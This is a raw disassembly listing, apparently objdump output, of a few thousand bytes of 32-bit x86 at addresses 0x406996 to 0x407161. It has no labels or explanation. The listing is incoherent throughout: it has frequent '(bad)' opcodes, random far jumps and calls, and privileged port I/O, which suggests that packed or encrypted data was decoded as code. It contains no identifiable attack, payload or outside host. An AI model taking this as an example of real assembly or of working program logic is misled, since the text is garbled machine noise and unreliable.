  406996:	fcmovbe st,st(7)
  406998:	daa    
  406999:	call   0xff3a:0x8cce6120
  4069a0:	ss jg  0x406926
  4069a3:	les    esp,FWORD PTR [ecx+ebx*1]
  4069a6:	sti    
  4069a7:	adc    al,0xea
  4069a9:	push   ebx
  4069aa:	push   ebx
  4069ac:	jmp    0xe320:0x28841ac5
  4069b3:	push   ds
  4069b4:	mov    ah,0x24
  4069b6:	(bad)  [eax+ebp*8]
  4069b9:	add    bh,BYTE PTR [ebx-0x79]
  4069bc:	stos   BYTE PTR es:[edi],al
  4069bd:	sbb    DWORD PTR [edi],edi
  4069bf:	mov    ch,0xac
  4069c1:	fwait
  4069c2:	and    BYTE PTR [eax-0x4f13159f],0xea
  4069c9:	test   edi,eax
  4069cb:	(bad)
  4069ce:	(bad)  
  4069cf:	loop   0x4069b1
  4069d1:	ficom  WORD PTR [edx+0x5dcab14d]
  4069d7:	icebp  
  4069d8:	and    bl,BYTE PTR [edi]
  4069da:	(bad)  
  4069db:	std    
  4069dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069dd:	cvtps2pd xmm5,QWORD PTR [esp+ebp*2+0x1b]
  4069e2:	lea    ebx,[edx+0x47070fdb]
  4069e8:	mov    ah,0xda
  4069ea:	sbb    dl,BYTE PTR [edi+0x1b0295fc]
  4069f0:	loop   0x4069c3
  4069f2:	sbb    BYTE PTR [edi-0x35],dh
  4069f5:	les    edi,FWORD PTR [esi]
  4069f7:	fidivr DWORD PTR [ebp+0x3c872a04]
  4069fd:	shl    BYTE PTR [ebx-0x424a4da7],1
  406a03:	pop    ds
  406a04:	pop    DWORD PTR [eax-0x6c]
  406a07:	and    esi,DWORD PTR [ecx-0x6c]
  406a0a:	cmp    eax,0xe925d324
  406a0f:	xchg   ebx,eax
  406a10:	jae    0x406a18
  406a12:	mov    ebx,0x232c4b71
  406a17:	add    cl,BYTE PTR [ebp+0x54]
  406a1a:	mov    al,ds:0xbde369c7
  406a1f:	ins    BYTE PTR es:[edi],dx
  406a20:	div    BYTE PTR ds:0x9dff473d
  406a26:	jae    0xed796ad0
  406a2c:	dec    edx
  406a2d:	out    dx,eax
  406a2e:	xchg   ebp,eax
  406a2f:	sar    dl,cl
  406a31:	hlt    
  406a32:	push   edx
  406a33:	dec    ebp
  406a34:	and    ebp,0x8a8a1504
  406a3a:	ins    DWORD PTR es:[edi],dx
  406a3b:	mov    DWORD PTR [edi+0x1f70c65c],0x7be59a6a
  406a45:	mov    bh,0x8b
  406a48:	ins    BYTE PTR es:[edi],dx
  406a49:	popa   
  406a4a:	mov    eax,ds:0xf51ce496
  406a4f:	lahf   
  406a50:	ins    DWORD PTR es:[edi],dx
  406a51:	xchg   BYTE PTR [edx+eiz*8-0x6ecb3380],bh
  406a58:	daa    
  406a59:	and    eax,0x742417b8
  406a5e:	jb     0x406a8f
  406a60:	xor    al,0xad
  406a62:	imul   ebp,DWORD PTR ds:0xbb5a7022,0xffffffb4
  406a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a6a:	inc    ebx
  406a6b:	outs   dx,BYTE PTR ds:[esi]
  406a6c:	xchg   BYTE PTR [ebp+eiz*2+0x21],ah
  406a70:	sub    eax,0xe378448
  406a75:	rcr    DWORD PTR [esi-0x67],1
  406a78:	(bad)  
  406a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7a:	lahf   
  406a7b:	cmp    al,0xe4
  406a7d:	mov    al,0xfc
  406a7f:	jns    0x406aa5
  406a81:	das    
  406a82:	sbb    ebx,eax
  406a84:	pop    ebp
  406a85:	shl    BYTE PTR [edx],0x6
  406a88:	and    ecx,DWORD PTR [ebx+0x7f276871]
  406a8e:	adc    BYTE PTR [eax-0x25],bl
  406a91:	pop    ecx
  406a92:	sub    eax,0x6df055c6
  406a97:	jae    0x406ad0
  406a99:	push   0x20b731e9
  406a9e:	shr    BYTE PTR [ebx],1
  406aa0:	or     ebx,edx
  406aa2:	or     ch,BYTE PTR [ecx]
  406aa4:	xchg   edx,eax
  406aa5:	je     0x406abe
  406aa7:	sub    edx,ecx
  406aa9:	ins    DWORD PTR es:[edi],dx
  406aaa:	inc    ecx
  406aab:	add    al,0xa0
  406aad:	push   cs
  406aae:	inc    edi
  406aaf:	mov    eax,0x297e172a
  406ab4:	mov    dh,BYTE PTR [edi+0x16]
  406ab7:	mov    BYTE PTR [ebx+0x4c865801],ah
  406abd:	(bad)  
  406abe:	repnz mov dh,0xee
  406ac1:	add    ch,dh
  406ac3:	or     bh,BYTE PTR [ebp+0x77]
  406ac6:	adc    DWORD PTR [ebp+0x7e0e9ce8],eax
  406acc:	cmp    DWORD PTR [edx+0x42],0xffffff93
  406ad0:	mov    DWORD PTR [edi],eax
  406ad2:	imul   eax,DWORD PTR [edx+0x1e],0xffffffc4
  406ad6:	inc    ecx
  406ad7:	jne    0x406b21
  406ad9:	mov    ah,0x43
  406adb:	cmp    ebp,0x498a5c23
  406ae1:	sub    ebx,esp
  406ae3:	inc    eax
  406ae4:	add    al,0x7c
  406ae6:	mov    dl,0x20
  406ae8:	cld    
  406ae9:	in     eax,0x1c
  406aeb:	hlt    
  406aec:	sbb    cl,bh
  406aee:	push   esp
  406aef:	inc    edi
  406af0:	fcomi  st,st(2)
  406af2:	ja     0x406b21
  406af4:	mov    es:0x3928665e,al
  406afa:	mov    ds:0x1b6664ea,eax
  406aff:	(bad)  
  406b00:	jl     0x406b51
  406b02:	lea    esp,[ebp+0x49]
  406b05:	sbb    cl,dh
  406b07:	xchg   esp,eax
  406b08:	bound  esi,QWORD PTR [eax]
  406b0a:	and    DWORD PTR [edx+edx*8-0x29],esp
  406b0e:	dec    DWORD PTR [ecx+0x21]
  406b11:	fimul  WORD PTR [edi]
  406b13:	shl    BYTE PTR [esi-0x7552fff0],cl
  406b19:	push   ebx
  406b1a:	inc    edi
  406b1b:	xor    DWORD PTR [esi],0xe9975e7f
  406b21:	push   edx
  406b22:	in     al,dx
  406b23:	adc    eax,0x958a417c
  406b28:	xchg   BYTE PTR [ebx+eiz*2],bl
  406b2b:	push   es
  406b2c:	(bad)  
  406b2d:	outs   dx,DWORD PTR ds:[esi]
  406b2e:	aas    
  406b2f:	test   BYTE PTR [eax+0x3f],al
  406b32:	je     0x406b44
  406b34:	jnp    0x406bb0
  406b36:	or     al,0x72
  406b38:	addr16 cmp al,0x5
  406b3b:	cmp    bh,dl
  406b3d:	(bad)  
  406b3f:	dec    edi
  406b40:	or     al,0x7b
  406b42:	add    dl,ch
  406b44:	mov    cl,0xef
  406b46:	adc    DWORD PTR [ebp+0x2d],esi
  406b49:	xor    al,0x57
  406b4b:	retf   
  406b4c:	test   BYTE PTR [esi+edi*1+0x15359f6d],bl
  406b53:	cmp    DWORD PTR [edx-0xa],0x3ee5a7aa
  406b5a:	xor    al,0xe8
  406b5d:	jp     0x406b8f
  406b5f:	lds    edi,FWORD PTR [eax+0x30a75d5d]
  406b65:	lds    edx,FWORD PTR [edx]
  406b67:	aas    
  406b68:	mov    esi,0xe041b2b3
  406b6d:	or     ch,BYTE PTR [edx+ecx*8-0x56bc1799]
  406b74:	sub    DWORD PTR [ecx+0x64],0x8b5c38fd
  406b7b:	leave  
  406b7c:	dec    esp
  406b7d:	xlat   BYTE PTR ds:[ebx]
  406b7e:	pusha  
  406b7f:	and    bl,BYTE PTR [ecx+0x1c502c15]
  406b85:	dec    ecx
  406b86:	sub    ah,al
  406b88:	bound  ecx,QWORD PTR [edi+0x7e26483]
  406b8e:	sub    bx,sp
  406b91:	xchg   esp,eax
  406b92:	xchg   esi,eax
  406b93:	and    ch,ah
  406b95:	pusha  
  406b96:	mov    esp,0x261915f7
  406b9b:	adc    al,0x2b
  406b9d:	in     al,dx
  406b9e:	ret    0x7893
  406ba1:	(bad)  
  406ba2:	cmc    
  406ba3:	jp     0x406b88
  406ba5:	pop    edi
  406ba6:	clc    
  406ba7:	and    edx,DWORD PTR [eax+0x33fe8508]
  406bad:	sub    eax,0x36395d4c
  406bb2:	inc    edi
  406bb4:	xchg   edi,eax
  406bb5:	adc    al,0x67
  406bb7:	mov    cl,0xbb
  406bb9:	(bad)  
  406bba:	push   ss
  406bbb:	push   eax
  406bbc:	pop    esp
  406bbd:	adc    bl,0xa
  406bc0:	les    ebp,FWORD PTR es:[ebp-0x43b3ffcd]
  406bc7:	sbb    bl,BYTE PTR [eax+0x7f]
  406bca:	dec    esp
  406bcb:	retf   
  406bcc:	xor    eax,0x387780bf
  406bd1:	push   esp
  406bd2:	pop    ss
  406bd3:	inc    ecx
  406bd4:	mov    ?,esp
  406bd6:	imul   edi,DWORD PTR [esi+esi*1-0x5409c18f],0xffffffa4
  406bde:	je     0x406be3
  406be0:	ffree  st(6)
  406be2:	popa   
  406be3:	pop    ecx
  406be4:	mov    ecx,0x41866d7f
  406be9:	jo     0x406c52
  406beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bec:	mov    dh,0x12
  406bee:	test   DWORD PTR [ecx+edx*1],0x583c6997
  406bf5:	ret    0xdef7
  406bf8:	daa    
  406bf9:	adc    DWORD PTR [ecx+0x7202c8d1],edx
  406bff:	xor    eax,DWORD PTR [ebx-0x3ce364d0]
  406c05:	lock xor BYTE PTR [bx+di],cl
  406c09:	inc    esp
  406c0a:	sub    eax,0xa7a0997d
  406c0f:	xchg   esp,eax
  406c10:	fdiv   st(0),st
  406c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c13:	test   BYTE PTR [edi+0x78],cl
  406c16:	mov    esi,DWORD PTR [esi]
  406c18:	fbld   TBYTE PTR [edi+0x15]
  406c1b:	fnsave [esi]
  406c1d:	je     0x406be1
  406c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c20:	inc    edi
  406c21:	cmp    esi,DWORD PTR [esi]
  406c23:	(bad)  
  406c24:	retf   
  406c25:	or     dh,BYTE PTR [ebx-0x18aedf53]
  406c2b:	mov    al,0x89
  406c2d:	mov    al,0x9b
  406c2f:	inc    edi
  406c30:	mov    BYTE PTR [esi+eiz*8+0x7910b139],dl
  406c37:	add    BYTE PTR [eax+0x5b],bh
  406c3a:	data16 daa 
  406c3c:	dec    edx
  406c3d:	jnp    0x406cb9
  406c3f:	cmp    eax,0x6ee73b2d
  406c44:	ret    
  406c45:	inc    DWORD PTR [eax-0x54]
  406c48:	mov    al,0xbd
  406c4a:	adc    cl,BYTE PTR [edi+0x865ab43]
  406c50:	in     al,0xc
  406c52:	imul   ebx,DWORD PTR [ebp-0x27aed879],0x4d6b4871
  406c5c:	cld    
  406c5d:	mov    BYTE PTR [edi-0x6d],dh
  406c60:	push   ebx
  406c61:	shrd   DWORD PTR [edx],edi,0x94
  406c65:	xor    al,BYTE PTR [edx-0x5274974e]
  406c6b:	xor    al,0xbb
  406c6d:	test   BYTE PTR [edx+0x33],bl
  406c70:	sub    ebp,edx
  406c72:	jmp    0xdef99f15
  406c77:	mov    ecx,0x7475fe0b
  406c7c:	test   al,0x95
  406c7e:	lds    esi,FWORD PTR [edx+0x2b]
  406c81:	xor    DWORD PTR [ebx-0x63d7aa],0x4f086539
  406c8b:	mov    dh,0x8c
  406c8d:	push   eax
  406c8e:	pop    ebx
  406c8f:	daa    
  406c90:	inc    esi
  406c91:	nop
  406c92:	jo     0x406c18
  406c94:	jge    0x406cd3
  406c96:	push   ds
  406c97:	outs   dx,DWORD PTR ds:[esi]
  406c98:	test   ch,bh
  406c9a:	jecxz  0x406cd0
  406c9c:	mov    ds:0x25035aca,eax
  406ca1:	out    0x56,al
  406ca3:	sub    DWORD PTR [esi],0xffffffa8
  406ca6:	rcl    DWORD PTR ds:0xaed47ac7,1
  406cac:	xchg   ecx,eax
  406cad:	jne    0x406c76
  406caf:	mov    ebp,0xdd2ee7ff
  406cb4:	and    al,0x4
  406cb6:	popa   
  406cb7:	shl    BYTE PTR [ebx+0x76],1
  406cba:	mov    bl,0x6d
  406cbc:	out    dx,al
  406cbd:	jp     0x406c41
  406cbf:	outs   dx,DWORD PTR ds:[esi]
  406cc0:	ja     0x406ca9
  406cc2:	or     BYTE PTR [edx+ebx*1-0x2d],0xdd
  406cc7:	xchg   esp,eax
  406cc8:	sub    eax,0xadcd6b94
  406ccd:	dec    esi
  406cce:	fcomp  QWORD PTR [ecx]
  406cd0:	cdq    
  406cd1:	push   edx
  406cd2:	dec    eax
  406cd3:	(bad)  
  406cd4:	adc    BYTE PTR [ebp-0x77cb98d0],dh
  406cda:	xor    DWORD PTR [ecx+edx*2+0x40],esp
  406cde:	xchg   ebp,eax
  406cdf:	leave  
  406ce0:	xchg   ebx,eax
  406ce1:	xor    al,0x18
  406ce3:	imul   esp,ebp,0x1b
  406ce6:	adc    BYTE PTR [ebp+ebx*1+0x28],cl
  406cea:	aaa    
  406ceb:	sub    ecx,DWORD PTR es:[ebp-0x58cc23de]
  406cf2:	xchg   esp,eax
  406cf3:	xor    eax,0x916aa254
  406cf8:	(bad)  
  406cf9:	frstor [ebp+0x179130b]
  406cff:	adc    DWORD PTR [ebx-0x649e0e62],0x8902d678
  406d09:	imul   esp,eax,0x4f
  406d0c:	hlt    
  406d0d:	loopne 0x406cde
  406d0f:	mov    ebp,0xb282bbe7
  406d14:	rcr    DWORD PTR [ecx+0x72],0xdb
  406d18:	(bad)  
  406d19:	sbb    DWORD PTR [esi],edx
  406d1b:	mov    al,0x20
  406d1d:	mov    bh,0x48
  406d1f:	lods   eax,DWORD PTR ds:[esi]
  406d20:	pop    ds
  406d21:	(bad)  
  406d22:	(bad)  
  406d23:	pop    edx
  406d24:	and    eax,0x103b4d37
  406d29:	dec    esp
  406d2a:	sub    al,0xbb
  406d2c:	mov    ebp,DWORD PTR [esi-0x685c530c]
  406d32:	ficomp DWORD PTR [ebx-0x7d]
  406d35:	loop   0x406cd1
  406d37:	cli    
  406d38:	call   0x6d5ad7f2
  406d3d:	adc    cl,BYTE PTR [eax]
  406d3f:	stos   DWORD PTR es:[edi],eax
  406d40:	ins    BYTE PTR es:[edi],dx
  406d41:	cmp    eax,0xace4af18
  406d46:	out    0xbc,eax
  406d48:	hlt    
  406d49:	cs cwde 
  406d4b:	or     DWORD PTR [edi],edx
  406d4d:	int    0x5d
  406d4f:	adc    eax,0x53f3c239
  406d54:	int3   
  406d55:	sub    cl,BYTE PTR [eax]
  406d57:	inc    DWORD PTR [esi]
  406d59:	sub    ch,0xf5
  406d5c:	stos   BYTE PTR es:[edi],al
  406d5d:	nop
  406d5e:	out    dx,eax
  406d5f:	mov    ds:0xe755f908,eax
  406d64:	imul   edi,DWORD PTR [edi-0x4857dda9],0xffffffa3
  406d6b:	dec    ecx
  406d6c:	dec    esi
  406d6d:	dec    esi
  406d6e:	cli    
  406d6f:	adc    esi,ebx
  406d71:	dec    esp
  406d72:	fwait
  406d73:	lds    ebx,FWORD PTR [eax]
  406d75:	push   ebp
  406d76:	test   BYTE PTR [ebx-0x32],bh
  406d79:	sbb    edi,DWORD PTR [ebx]
  406d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d7c:	repz mov ds:0x967aa797,al
  406d82:	mov    edi,0xb360daac
  406d87:	es mov esp,0x45615e13
  406d8d:	(bad)  
  406d8e:	out    dx,al
  406d8f:	xchg   esp,eax
  406d90:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  406d92:	xor    bl,ah
  406d94:	adc    al,0x9f
  406d96:	or     eax,0xf8c10625
  406d9b:	inc    ecx
  406d9c:	dec    eax
  406d9d:	jae    0x406d9a
  406d9f:	stc    
  406da0:	add    cl,BYTE PTR [edi-0x24]
  406da3:	xchg   ecx,eax
  406da4:	cs xor edx,0xb1ecaf9f
  406dab:	sub    al,0x69
  406dad:	jecxz  0x406e1c
  406daf:	(bad)  
  406db0:	pop    ss
  406db1:	pop    edi
  406db2:	mov    WORD PTR [ecx-0x7e500c12],ds
  406db8:	icebp  
  406db9:	add    al,0xb3
  406dbb:	mov    DWORD PTR [eax+0x64],ecx
  406dbe:	or     eax,0xdd58dcb1
  406dc3:	or     al,0xe6
  406dc5:	add    dl,BYTE PTR [eax]
  406dc7:	inc    ebx
  406dc8:	push   ecx
  406dc9:	inc    edx
  406dca:	mov    esi,0x8a96a2a7
  406dcf:	mov    DWORD PTR [edx],ebx
  406dd1:	mov    bh,0xa5
  406dd3:	xchg   edx,eax
  406dd4:	jmp    0xc448:0x90883a4a
  406ddb:	or     cl,bh
  406ddd:	call   0xa293:0xd5a68a84
  406de4:	aas    
  406de5:	ret    0x49d7
  406de8:	mov    dh,0x7e
  406dea:	sub    eax,0x922a2898
  406def:	ret    
  406df0:	cdq    
  406df1:	add    ah,BYTE PTR [esi]
  406df3:	in     al,dx
  406df4:	mov    cl,0x3
  406df6:	loopne 0x406e44
  406df8:	add    eax,0xf5fe33c9
  406dfd:	and    al,0x82
  406dff:	sar    BYTE PTR [esi+0x35],0x3c
  406e03:	loope  0x406e0b
  406e05:	aad    0xdf
  406e07:	xchg   edi,eax
  406e08:	sahf   
  406e09:	mov    ds:0xccf55617,eax
  406e0e:	push   es
  406e0f:	jmp    0x406e59
  406e11:	jmp    0xfa2c718d
  406e16:	cli    
  406e17:	ret    
  406e18:	cmp    DWORD PTR [edi],ebx
  406e1a:	push   ds
  406e1b:	inc    eax
  406e1c:	retf   
  406e1d:	leave  
  406e1e:	sub    DWORD PTR [edi-0x60],esi
  406e21:	pop    ss
  406e22:	sahf   
  406e23:	sbb    al,0xff
  406e25:	rol    BYTE PTR [ebp-0x7d],0x30
  406e29:	adc    ch,BYTE PTR [ebp+0x73]
  406e2c:	lahf   
  406e2d:	jmp    0x406e8b
  406e2f:	inc    ecx
  406e30:	sar    dl,1
  406e32:	jecxz  0x406e5b
  406e34:	ja     0x406e96
  406e36:	fdivr  QWORD PTR [eax]
  406e38:	fisubr WORD PTR [edx]
  406e3a:	sub    al,0x22
  406e3c:	mov    bh,0x91
  406e3e:	mov    BYTE PTR [edx+0x3b],ch
  406e41:	or     DWORD PTR [ebx],eax
  406e43:	push   cs
  406e44:	sbb    BYTE PTR [eax-0x5],bh
  406e47:	sub    dh,BYTE PTR [ebx]
  406e49:	fwait
  406e4a:	ret    0x719b
  406e4d:	mov    ds:0x3f2f8c1b,eax
  406e52:	cwde   
  406e53:	cmp    dh,bl
  406e55:	inc    esp
  406e56:	sub    BYTE PTR [ecx],bl
  406e58:	xchg   ecx,eax
  406e59:	or     dl,BYTE PTR [edx+0x6d51b22]
  406e5f:	aaa    
  406e60:	push   esp
  406e61:	jno    0x406e59
  406e63:	mov    ds:0x5232273b,al
  406e68:	(bad)  
  406e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e6b:	lods   al,BYTE PTR ds:[esi]
  406e6c:	out    0x2a,al
  406e6e:	and    BYTE PTR [edi+0x66],cl
  406e71:	sti    
  406e72:	out    0x17,eax
  406e74:	jmp    0xd1e4:0x16cc338e
  406e7b:	test   eax,0x92317536
  406e80:	in     eax,0xdb
  406e82:	imul   ebp,ebx,0x11
  406e85:	xchg   esp,eax
  406e86:	sbb    BYTE PTR [ecx-0x5d],bh
  406e89:	xor    eax,0x3274e79b
  406e8e:	pop    esi
  406e8f:	loope  0x406f06
  406e91:	fisubr DWORD PTR [edx+0x2d6f3041]
  406e97:	arpl   WORD PTR [ebx-0x69],bp
  406e9a:	frstor [ebx+0xf53d200]
  406ea0:	rcl    DWORD PTR [ebp+0x9ab1877],cl
  406ea6:	cmp    al,0x10
  406ea8:	push   cs
  406ea9:	jmp    0x44f17777
  406eae:	cli    
  406eaf:	sub    al,0x7e
  406eb1:	xor    ch,BYTE PTR [ecx+0x771f3c88]
  406eb7:	nop
  406eb8:	call   0x17e19bd4
  406ebd:	enter  0xece7,0x82
  406ec1:	cmp    cl,al
  406ec3:	ja     0x406ee9
  406ec5:	dec    eax
  406ec6:	pop    es
  406ec7:	cld    
  406ec8:	arpl   si,cx
  406eca:	stos   BYTE PTR es:[edi],al
  406ecb:	int3   
  406ecc:	add    ebp,DWORD PTR [edi-0x7e2a3ae3]
  406ed2:	mov    ds:0x8c9225d5,al
  406ed7:	fadd   DWORD PTR [ebx-0x13]
  406eda:	stc    
  406edb:	addr16 sub esp,0x84c9a169
  406ee2:	jmp    0x824a:0x6d196cf1
  406ee9:	mov    ch,0xf4
  406eeb:	out    dx,eax
  406eec:	fisubr DWORD PTR [edi+0x51]
  406eef:	push   esi
  406ef0:	leave  
  406ef1:	push   ecx
  406ef2:	aaa    
  406ef3:	push   esp
  406ef4:	push   edx
  406ef5:	retfw  
  406ef7:	fild   QWORD PTR [edi+0x71]
  406efa:	pop    esp
  406efb:	xor    BYTE PTR [edx-0x2bd2814f],dl
  406f01:	in     eax,0xd3
  406f03:	push   ecx
  406f04:	push   edi
  406f05:	(bad)  
  406f06:	fld    DWORD PTR [edx+ecx*2]
  406f09:	add    DWORD PTR [esi],0xffffffe3
  406f0c:	push   edx
  406f0d:	(bad)  
  406f0e:	sub    DWORD PTR [ecx+ebp*4],ebp
  406f11:	outs   dx,DWORD PTR ds:[esi]
  406f12:	(bad)  
  406f13:	jb     0x406f6c
  406f15:	in     al,0x7d
  406f17:	dec    eax
  406f18:	cmp    eax,0x9dd61db9
  406f1d:	retf   
  406f1e:	mov    al,ds:0x585f6f14
  406f23:	scas   eax,DWORD PTR es:[edi]
  406f24:	dec    ecx
  406f25:	mov    eax,ds:0x2063cf05
  406f2a:	push   ds
  406f2b:	pop    ebp
  406f2c:	aaa    
  406f2d:	pop    edi
  406f2e:	push   esp
  406f2f:	out    dx,eax
  406f30:	es in  eax,0x10
  406f33:	gs aaa 
  406f35:	daa    
  406f36:	jns    0x406fa2
  406f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f39:	fild   DWORD PTR [eax+0x6a]
  406f3c:	push   0xbe6a7c83
  406f41:	repnz xchg edi,eax
  406f43:	std    
  406f44:	jge    0x406ef4
  406f46:	mov    edx,0x1f3cd825
  406f4b:	lock lea ebp,[ebp-0x41]
  406f4f:	cmp    eax,0x11c94019
  406f54:	mov    eax,0xa2bb0e1d
  406f59:	or     BYTE PTR [edx+0x28fae3b],cl
  406f5f:	out    dx,eax
  406f60:	sbb    dl,BYTE PTR [esp+ecx*8-0x18]
  406f64:	test   BYTE PTR [esi-0x6f],cl
  406f67:	inc    ecx
  406f68:	jb     0x406f22
  406f6a:	jmp    0xa15b5e9e
  406f6f:	(bad)  
  406f70:	stc    
  406f71:	mov    dl,0xb6
  406f73:	lods   eax,DWORD PTR ds:[esi]
  406f74:	(bad)  [edi]
  406f76:	push   edx
  406f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f78:	push   ebp
  406f79:	mov    esi,0xce87b64c
  406f7e:	test   al,0x5
  406f80:	adc    dh,BYTE PTR [eax+0x56cefcac]
  406f86:	ins    BYTE PTR es:[edi],dx
  406f87:	push   edi
  406f88:	inc    esp
  406f89:	jmp    DWORD PTR [eax+0x3a]
  406f8c:	sub    BYTE PTR [ecx+eax*8],ah
  406f8f:	or     al,dh
  406f91:	imul   edi,ebp,0xd2ca66d5
  406f97:	lds    ebx,FWORD PTR [edi-0x1d]
  406f9a:	inc    ecx
  406f9b:	mov    dh,0x86
  406f9d:	sbb    BYTE PTR [ecx+0xf],0xb4
  406fa1:	out    0x17,al
  406fa3:	mov    eax,ds:0x42cd1204
  406fa8:	adc    al,0x80
  406faa:	inc    esi
  406fab:	xor    DWORD PTR [ebx-0x60becd83],edx
  406fb1:	push   cs
  406fb2:	mov    ds:0x4b2ab15c,al
  406fb7:	jb     0x406faa
  406fb9:	ja     0x406f43
  406fbb:	repz add bh,dl
  406fbe:	adc    esp,DWORD PTR [edx]
  406fc0:	dec    eax
  406fc1:	sub    DWORD PTR [edx+0x5c],0xffffff8b
  406fc5:	lods   eax,DWORD PTR ds:[esi]
  406fc6:	das    
  406fc7:	adc    bh,BYTE PTR [ebx]
  406fc9:	pushf  
  406fca:	and    eax,0xe17b0904
  406fcf:	jg     0x406fe2
  406fd1:	mov    esp,0x63477aeb
  406fd6:	add    eax,0xaeca50bb
  406fdb:	mov    eax,gs
  406fdd:	pop    es
  406fde:	mov    BYTE PTR [ebx+0x581e9bb4],dh
  406fe4:	in     eax,0x82
  406fe6:	pop    eax
  406fe7:	mov    edx,0xaabfee6e
  406fec:	mov    eax,0x21a3294e
  406ff1:	add    ch,ch
  406ff3:	or     edi,0x6a
  406ff6:	add    eax,ebp
  406ff8:	out    0x5a,al
  406ffa:	pop    ebx
  406ffb:	popf   
  406ffc:	or     ebx,DWORD PTR [eax+ebp*8]
  406fff:	gs cs xor eax,0x52aff79d
  407006:	xchg   edi,eax
  407007:	sti    
  407008:	xchg   edx,eax
  407009:	rcr    DWORD PTR [ebx-0x35ee40bc],1
  40700f:	fisub  WORD PTR [ebx-0x36]
  407012:	test   al,0x59
  407014:	inc    ebp
  407015:	(bad)  
  407017:	int    0xda
  407019:	fiadd  WORD PTR [edx+0x27]
  40701c:	ret    0x7d27
  40701f:	iret   
  407020:	into   
  407021:	cld    
  407022:	pop    es
  407023:	jo     0x407004
  407025:	push   0x4a088eb3
  40702a:	xor    dh,BYTE PTR [ebp+ecx*2+0x6c]
  40702e:	mov    edi,0x87717b6b
  407033:	mov    eax,ds:0x28a79600
  407038:	and    eax,0x3d2dda27
  40703d:	imul   ebp,DWORD PTR [esi+0x546badc0],0x60fb8d20
  407047:	and    eax,0x7d638ee3
  40704c:	jne    0x407074
  40704e:	push   es
  40704f:	mov    cl,ah
  407051:	sahf   
  407052:	push   cs
  407053:	push   es
  407054:	cmp    DWORD PTR [ebx+ecx*8-0x53],edi
  407058:	mov    dl,0x7e
  40705a:	loopne 0x4070a0
  40705c:	jo     0x40701c
  40705e:	xchg   ebx,eax
  40705f:	add    DWORD PTR [edx],ecx
  407061:	mov    ds,WORD PTR [eax-0x4f3464b9]
  407067:	emms   
  407069:	xor    BYTE PTR [esi],dl
  40706b:	and    ah,BYTE PTR [edx+0x19]
  40706e:	cmp    al,0xc2
  407070:	jge    0x40707a
  407072:	add    BYTE PTR [ecx-0x5c6142cf],ah
  407078:	pop    ebx
  407079:	add    DWORD PTR [ebp-0x1047ae43],esp
  40707f:	cmp    BYTE PTR [ebx],dh
  407081:	sbb    al,0x66
  407083:	fwait
  407084:	cmp    BYTE PTR [edx],al
  407086:	dec    ebp
  407087:	pop    es
  407088:	mov    DWORD PTR [ecx],edi
  40708a:	mov    bh,0xe9
  40708c:	sbb    bl,dl
  40708e:	lods   eax,DWORD PTR ds:[esi]
  40708f:	ja     0x4070d6
  407091:	push   cs
  407092:	imul   edx,DWORD PTR [edi],0x9b63270d
  407098:	mov    dh,bl
  40709a:	mov    edx,0xafbe80b1
  40709f:	scas   eax,DWORD PTR es:[edi]
  4070a0:	jmp    0x3960:0xfc1f75aa
  4070a7:	(bad)  
  4070a9:	loopne 0x407043
  4070ab:	or     edi,eax
  4070ad:	div    BYTE PTR es:[ebx+0x44878cfa]
  4070b4:	or     bl,BYTE PTR [edx+edx*8+0x2c7653fa]
  4070bb:	push   es
  4070bc:	cwde   
  4070bd:	sbb    al,0x19
  4070bf:	sbb    al,0x5b
  4070c1:	pushf  
  4070c2:	into   
  4070c3:	or     eax,0x7d126cc7
  4070c8:	jle    0x4070dd
  4070ca:	sub    eax,0x39d46e7a
  4070cf:	sub    bh,BYTE PTR [ebx+ebx*4-0x40]
  4070d3:	lock push esi
  4070d5:	lds    ebx,FWORD PTR [edi-0x29]
  4070d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070d9:	jecxz  0x4070b7
  4070db:	repnz mov ebp,0x7fc7dc27
  4070e1:	sahf   
  4070e2:	xor    eax,0xdd70a4c4
  4070e7:	jle    0x40712d
  4070e9:	mov    eax,0x3c422b0
  4070ee:	xchg   BYTE PTR [eax+0x3e],dl
  4070f1:	shr    DWORD PTR [esi+0x5cd8a59e],0xe9
  4070f8:	dec    edx
  4070f9:	mov    eax,0x4d36a3ef
  4070ff:	xchg   edx,eax
  407100:	mov    ah,0xab
  407102:	test   ch,0x6e
  407105:	cmp    eax,0x181da83f
  40710a:	mov    ds:0x1601ef14,al
  40710f:	jo     0x4070bd
  407111:	out    0xf6,al
  407113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407114:	add    cl,BYTE PTR [eax]
  407116:	loope  0x4070fa
  407118:	sbb    bh,ah
  40711a:	xchg   ebp,eax
  40711b:	jnp    0x407191
  40711d:	loopne 0x4070a6
  40711f:	push   edx
  407120:	dec    ebp
  407121:	aam    0x8c
  407123:	aaa    
  407124:	cld    
  407125:	daa    
  407126:	mul    BYTE PTR [esi]
  407128:	inc    ebp
  407129:	and    al,0x1c
  40712b:	(bad)  
  40712c:	jno    0x4071a6
  40712e:	scas   eax,DWORD PTR es:[edi]
  40712f:	adc    BYTE PTR [eax+edx*1+0x2ebcb3d1],bl
  407136:	cmp    esi,ebx
  407138:	(bad)
  40713b:	push   es
  40713c:	fisubr DWORD PTR [ebx]
  40713e:	or     al,0x33
  407140:	xchg   ebx,eax
  407141:	jne    0x407177
  407143:	std    
  407144:	pop    ebx
  407145:	jbe    0x40718e
  407147:	inc    esp
  407148:	popa   
  407149:	or     DWORD PTR [eax],0xffffffe8
  40714c:	loop   0x407141
  40714e:	or     al,0x5f
  407150:	sar    BYTE PTR [ebp-0x6986b864],cl
  407156:	ins    BYTE PTR es:[edi],dx
  407157:	sbb    sp,WORD PTR [ecx-0x2b]
  40715b:	jno    0x4071ce
  40715d:	hlt    
  40715e:	xor    BYTE PTR [ebp+0x26],dl
  407161:	jecxz  0x407152
